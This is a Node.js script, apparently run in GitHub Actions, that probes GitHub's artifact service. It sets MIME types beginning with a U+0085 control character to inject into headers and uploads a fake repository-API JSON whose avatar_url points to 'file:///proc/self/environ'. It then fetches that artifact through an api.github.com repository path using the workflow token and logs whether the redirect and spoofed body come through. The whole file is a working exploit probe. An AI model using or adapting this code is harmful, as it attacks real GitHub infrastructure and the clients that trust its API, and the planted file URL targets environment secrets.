import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const repo=process.env.GITHUB_REPOSITORY;
const shard=process.env.CARRIER_VARIANT;
const versions=shard==='raw'?[0,2,4,6,8,10,12]:[1,3,5,7,9,11,13];
const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const mime='\u0085application/json';
const sha=body=>createHash('sha256').update(body).digest('hex');
function request(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);
    const req=(target.protocol==='https:'?https:http).request(target,{method,headers,timeout:15000},res=>{
      const chunks=[];res.on('data',chunk=>chunks.push(chunk));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(chunks)}));
    });
    req.on('error',reject);req.on('timeout',()=>req.destroy(new Error('timeout')));
    if(body)req.write(body);req.end();
  });
}
async function upload(url,body){
  const response=await request(url,'PUT',body,{
    'x-ms-version':'2025-01-05',
    'x-ms-blob-type':'BlockBlob',
    'x-ms-blob-content-type':'\u0085application/json',
    'Content-Type':'application/octet-stream',
    'Content-Length':String(body.length),
  });
  if(response.status!==201)throw new Error(`Blob PUT ${response.status} ${response.headers['x-ms-error-code']||''}`);
}
async function run(version){
  const name=`repo-cassette-vmatrix-${process.env.GITHUB_RUN_ID}-v${version}`;
  const report={version,name,mimeHex:Buffer.from(mime).toString('hex')};
  try{
    const created=await client.CreateArtifact({...ids,name,version,mimeType:StringValue.create({value:mime})});
    if(!created.ok)throw new Error('CreateArtifact ok=false');
    report.uploadBlob=new URL(created.signedUploadUrl).pathname.split('/').at(-1);
    const placeholder=Buffer.from('{}');
    await upload(created.signedUploadUrl,placeholder);
    const finalized=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    if(!finalized.ok)throw new Error('FinalizeArtifact ok=false');
    report.artifactId=String(finalized.artifactId);
    const repository=`${repo}/actions/artifacts/${report.artifactId}/zip`;
    const body=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:`version ${version}`,stargazers_count:0}));
    await upload(created.signedUploadUrl,body);
    report.expectedSha=sha(body);
    for(let attempt=0;attempt<8;attempt++){
      const api=await request(`https://api.github.com/repos/${repository}`,'GET',null,{
        Authorization:`Bearer ${process.env.GITHUB_TOKEN}`,
        Accept:'application/vnd.github.v3+json',
        'User-Agent':'repo-cassette-version-matrix',
      });
      report.restStatus=api.status;
      if(api.status===404){await new Promise(r=>setTimeout(r,300));continue}
      if(api.status!==302||!api.headers.location)break;
      const location=new URL(api.headers.location);
      report.rsct=location.searchParams.get('rsct');
      report.downloadBlob=location.pathname.split('/').at(-1);
      const final=await request(location.href);
      report.finalStatus=final.status;
      report.finalContentTypeHex=(final.headers['content-type']||'').split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
      report.finalBodyMatch=final.body.equals(body);
      break;
    }
  }catch(error){report.error=String(error.message||error).slice(0,220)}
  console.log('VERSION_MATRIX',JSON.stringify(report));
}
for(const version of versions)await run(version);
